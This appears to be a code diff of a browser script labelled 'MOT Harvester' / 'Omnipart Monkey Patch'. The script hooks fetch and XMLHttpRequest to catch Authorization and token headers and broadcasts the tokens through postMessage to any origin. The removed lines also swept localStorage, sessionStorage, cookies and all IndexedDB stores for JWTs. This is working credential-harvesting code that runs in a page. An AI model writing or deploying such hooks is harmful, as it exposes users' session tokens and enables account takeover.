@@ -1,21 +1,32 @@
-console.log("[MOT Harvester] Initializing Omnipart Monkey Patch V3");
+console.log("[MOT Harvester] Initializing Omnipart Monkey Patch V4");
 
-function checkStringForToken(str, source) {
-    if (typeof str !== 'string') return;
-    if (str.includes('eyJ') && str.length > 50) {
+function extractAuthHeader(headers) {
+    if (!headers) return null;
+    let auth = null;
+    if (headers instanceof Headers) {
+        auth = headers.get('Authorization') || headers.get('authorization') || headers.get('Token') || headers.get('token');
+    } else if (Array.isArray(headers)) {
+        for (let [k, v] of headers) {
+            if (k.toLowerCase().includes('auth') || k.toLowerCase().includes('token')) auth = v;
+        }
+    } else {
+        for (let k in headers) {
+            if (k.toLowerCase().includes('auth') || k.toLowerCase().includes('token')) auth = headers[k];
+        }
+    }
+    return auth;
+}
+
+function processFoundAuth(auth, source) {
+    if (auth && typeof auth === 'string' && auth.length > 10) {
         if (!window['_omnipart_harvested_' + source]) {
             window['_omnipart_harvested_' + source] = true;
-            console.log("[MOT Harvester] CAUGHT TOKEN FROM " + source + "!", str.substring(0, 30) + "...");
+            console.log("[MOT Harvester] CAUGHT AUTH FROM " + source + "!", auth.substring(0, 30) + "...");
             
-            // Try to extract just the token if it's embedded in JSON or Bearer
-            let token = str;
-            let match = str.match(/(eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+)/);
-            if (match) {
-                token = match[1];
-            } else if (str.toLowerCase().startsWith('bearer ')) {
-                token = str.substring(7);
+            let token = auth;
+            if (auth.toLowerCase().startsWith('bearer ')) {
+                token = auth.substring(7);
             }
-            
             window.postMessage({ type: 'OMNIPART_TOKEN_INTERCEPT', token: token }, '*');
         }
     }
@@ -24,34 +35,19 @@ function checkStringForToken(str, source) {
 const originalFetch = window.fetch;
 window.fetch = async function(...args) {
     try {
+        let auth = null;
         if (args[0] instanceof Request) {
-            args[0].headers.forEach((value, key) => {
-                checkStringForToken(value, 'FETCH_REQ_HEADER');
-            });
-            checkStringForToken(args[0].url, 'FETCH_REQ_URL');
-        } else if (typeof args[0] === 'string') {
-            checkStringForToken(args[0], 'FETCH_URL');
+            auth = extractAuthHeader(args[0].headers);
+            processFoundAuth(auth, 'FETCH_REQ_OBJ');
         }
-        
-        if (args[1]) {
-            if (args[1].headers) {
-                const h = args[1].headers;
-                if (h instanceof Headers) {
-                    h.forEach((value, key) => checkStringForToken(value, 'FETCH_OPT_HEADER_OBJ'));
-                } else if (Array.isArray(h)) {
-                    for (let [key, value] of h) checkStringForToken(value, 'FETCH_OPT_HEADER_ARR');
-                } else {
-                    for (let key in h) checkStringForToken(h[key], 'FETCH_OPT_HEADER_DICT');
-                }
-            }
-            if (typeof args[1].body === 'string') {
-                checkStringForToken(args[1].body, 'FETCH_BODY');
-            }
+        if (args[1] && args[1].headers) {
+            auth = extractAuthHeader(args[1].headers);
+            processFoundAuth(auth, 'FETCH_OPT_OBJ');
         }
     } catch (e) { 
         console.error("[MOT Harvester] error in fetch patch", e);
     }
-    return originalFetch.apply(this, args);
+    return originalFetch.apply(window, args);
 };
 
 const originalOpen = XMLHttpRequest.prototype.open;
@@ -65,66 +61,12 @@ XMLHttpRequest.prototype.open = function() {
 
 XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
     this._requestHeaders[header] = value;
-    checkStringForToken(value, 'XHR_HEADER');
+    if (header.toLowerCase().includes('auth') || header.toLowerCase().includes('token')) {
+        processFoundAuth(value, 'XHR_HEADER');
+    }
     return originalSetRequestHeader.apply(this, arguments);
 };
 
 XMLHttpRequest.prototype.send = function(body) {
-    if (typeof body === 'string') {
-        checkStringForToken(body, 'XHR_BODY');
-    }
     return originalSend.apply(this, arguments);
 };
-
-// Also proactively check localStorage in case they saved it securely there
-setInterval(() => {
-    try {
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            const val = localStorage.getItem(key) || "";
-            checkStringForToken(val, 'LOCALSTORAGE');
-        }
-        
-        // Sometimes it's stored in sessionStorage
-        for (let i = 0; i < sessionStorage.length; i++) {
-            const key = sessionStorage.key(i);
-            const val = sessionStorage.getItem(key) || "";
-            checkStringForToken(val, 'SESSIONSTORAGE');
-        }
-
-        // Check cookies
-        const cookies = document.cookie.split(';');
-        for (let c of cookies) {
-            checkStringForToken(c, 'COOKIE');
-        }
-    } catch (e) {}
-}, 2000);
-
-// Finally, scan IndexedDB. This is often where modern apps hide JWTs from memory!
-setTimeout(async () => {
-    try {
-        const dbs = await window.indexedDB.databases();
-        for (let dbInfo of dbs) {
-            if (!dbInfo.name) continue;
-            const request = window.indexedDB.open(dbInfo.name);
-            request.onsuccess = (e) => {
-                const db = e.target.result;
-                try {
-                    const storeNames = db.objectStoreNames;
-                    for (let storeName of storeNames) {
-                        const tx = db.transaction([storeName], 'readonly');
-                        const store = tx.objectStore(storeName);
-                        const allReq = store.getAll();
-                        allReq.onsuccess = (evt) => {
-                            const res = evt.target.result;
-                            if (res) {
-                                let str = JSON.stringify(res);
-                                checkStringForToken(str, 'INDEXEDDB_' + dbInfo.name);
-                            }
-                        };
-                    }
-                } catch(err) {} 
-            };
-        }
-    } catch (e) {}
-}, 3000);
